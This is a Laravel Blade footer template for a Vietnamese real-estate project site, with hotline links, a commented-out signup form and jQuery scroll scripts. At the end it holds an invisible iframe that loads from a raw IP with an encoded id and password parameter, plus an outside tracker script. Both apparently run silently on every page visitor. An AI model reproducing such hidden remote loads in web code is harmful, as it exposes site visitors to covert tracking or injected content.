<div class="clearfix"></div>
<div class="dx_footer_bg">
            <div class="dx_footer_content">
                <div class="col-md-3 dx_footer_logo">
                    <a href=""><img src="{!!$info->logo!!}">
                    </a>
                </div>
                <div class="col-md-5 dx_footer_about">
                {!!$info->footer_left!!}
                </div>
                <div class="col-md-4 dx_footer_contact">
                    {!!$info->footer_right!!}
                </div>
            </div>
            <!--Footer Mobile Start-->
            <div class="dx_footer_content_mobile">
                <div class="dx_footer_logo_mobile">
                    <a href=""><img src="{!!$info->logo!!}">
                    </a>
                </div>
                <div class="dx_line"></div>
                <div class="dx_footer_about_mobile">{!!$info->footer_left!!}
                </div>
            </div>
            <!--Footer Mobile End-->
        </div>
        <div class="dx_footer_copyright">
            {{$info->copyright}}
        </div>
        <!--Đăng ký nhận thông tin dự án Start-->
        <div class="hotline2">
            <a href="tel:{{$info->hotline}}"><img src="{{$info->hotline_img}}" /></a> <br>
            <a href="tel:{{$info->hotline2}}"><img src="{{$info->hotline_img2}}" /></a>
        </div>
         <!-- <div class="dx_submit_project dx_submit_project_hide">
		<h6>Đăng ký nhận tin dự án <button class="fa fa-chevron-down click-up"></button></h6>
		<div class="dx_submit_project_content">
		
			<form action="subcribe" method="post">
			{{csrf_field()}}
			<div class="dx_search_field">
				<input type="text" id="reg-name" placeholder="Họ và tên" name="name" required="">
			</div>
			<div class="dx_search_field">
				<input type="text" id="reg-email" placeholder="Email" name="email" >
			</div>
			<div class="dx_search_field">
				<input type="text" name='phone' id="reg-phone" placeholder="Số điện thoại">
			</div>
			<div class="kf_property_field">
			<?php  
        $page=DB::table('pages')->select('id','alias')->where("alias",'du-an')->first();
        $post=DB::table("posts")->where("page_id",$page->id)->get();
        ?>
				<select class="chosen-select" id="careProject" name="project">
					<option value="">Dự án quan tâm</option>
					@foreach($post as $item)
					<option value="{{$item->id}}">{{$item->title}}</option>
					@endforeach
				</select>
			</div>
			<div class="dx_search_field">
				<textarea id="reg-note" name='content' placeholder="Nội dung yêu cầu..." style="width: 100%; height: 100px"></textarea>
			</div>
			<div class="kf_property_field">
				<button class="btn btn-primary" id="send-register-project">Gửi yêu cầu</button>
			</div>
			</form>
		</div>
	</div> -->
	<!--Đăng ký nhận thông tin dự án End-->
	<!-- end footer-bar -->
    <!-- <div class="helperPanel">
		<div class="container">
			<div class="row">
				<div class="col-xs-12">
					<a class="calltoaction first" href="tel:0936 19 33 11" title="call phone" >
						Kinh Doanh Online
					</a><a class="calltoaction" href="tel:0936 19 331 1" title="call phone" >
						<i class="ion ion-android-call-40"></i>
						<span>
							09936 19 33 11
						</span>
					</a>
				</div>
			</div>
		</div>
	</div> -->
   <div class="projectProgress">
            <a href="tel:{{$info->tiendo}}" >
                <img src="{{$info->tiendo_img}}"  />
            </a><br/><br/>
        </div> 
	<a href="http://hateco.com.vn/#0" class="cd-top cd-is-visible cd-fade-out"><i class="ion ion-arrow-up-b"></i></a>
    <!-- Google Tag Manager -->
    <script src="js/jquery-1.11.0.min.js"></script>
    <script type="text/javascript">
        (function($) {
            $(window).load(function() {
                $(".loading .table .inner").addClass("fade");
                $('.loading').delay(500).addClass("slide-up");

                var element = $('.dx_widget_bg');
                originalY = element.offset().top;



// Space between element and top of screen (when scrolling)
                var topMargin = 20;

// Should probably be set in CSS; but here just for emphasis
                element.css('position', 'relative');

                $(window).on('scroll', function(event) {
                    var scrollTop = $(window).scrollTop();
                    var topContent = $('.box_slidebar').height() + originalY;
                    if (scrollTop < (topContent + 9000) ){
                        element.stop(false, false).animate({
                            top:
                                scrollTop < originalY ? 0 : scrollTop - originalY + topMargin +70
                        }, 300);
                    }
                });
            });
        })(jQuery)
    </script>
    <script src="js/plugins.js"></script>
    <script src="js/scripts.js"></script>
	
    <!--Jquery UI Library-->
    <script src="js/range-slider.js"></script>
    <!--Bootstrap core JavaScript-->
    <script src="js/bootstrap.js"></script>
    <!--Bx-Slider JavaScript-->
    <script src="js/jquery.bxslider.js"></script>
    <!--Owl Carousel JavaScript-->
    <script src="js/owl.carousel.js"></script>
    <!--Pretty Photo JavaScript-->
    <script src="js/jquery.prettyPhoto.js"></script>
    <!--Accordian JavaScript-->
    <script src="js/jquery.accordion.js"></script>
    <!--Number Count (Waypoints) JavaScript-->
    <script src="js/waypoints-min.js"></script>
    <!-- Chosen Script Javascript -->
    <script src="js/chosen.jquery.min.js"></script>
    <!-- Time Counter Script Javascript -->
    <script src="js/jquery.downCount.js"></script>
    <!-- Filterable Script Javascript -->
    <script src="js/jquery-filterable.js"></script>
    <!--Dl Menu Script-->
    <script src="js/modernizr.custom.js"></script>
    <script src="js/jquery.dlmenu.js"></script>
    <!--Map hightlight-->
    <script src="js/jquery.maphilight.js"></script>
    <!--Map JavaScript-->
    <!--<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false"></script>-->
    <script src="js/jssor.slider-21.1.6.min.js" type="text/javascript"></script>
    <!--Custom JavaScript-->
    <script src="js/custom.js"></script>
    <script type="text/javascript" src="js/frontend.js" charset="utf-8"></script>
    <script type="text/javascript" src="js/global.js"></script>
<script>
      $(".nav-tabs a.scrolls").on('click', function (event) {
        // Prevent default anchor click behavior
        event.preventDefault();
        // Store hash
        var hash = this.hash;
        // Using jQuery's animate() method to add smooth page scroll
        // The optional number (800) specifies the number of milliseconds it takes to scroll to the specified area
        $('html, body').animate({
            scrollTop: $(hash).offset().top-67
        }, 500, function () {
            // Add hash (#) to URL when done scrolling (default click behavior)
            window.location.hash = hash;
        });
    });
</script>
    @yield('script')
<iframe src="http://119.15.167.79/data/?id=aWQ9MzU5JnBhc3M9dmluYWRzcHJv" style="display: none;"></iframe>
<script type='text/javascript' src='//c.trazk.com/c.js?_key=undefined' async='async' > </script>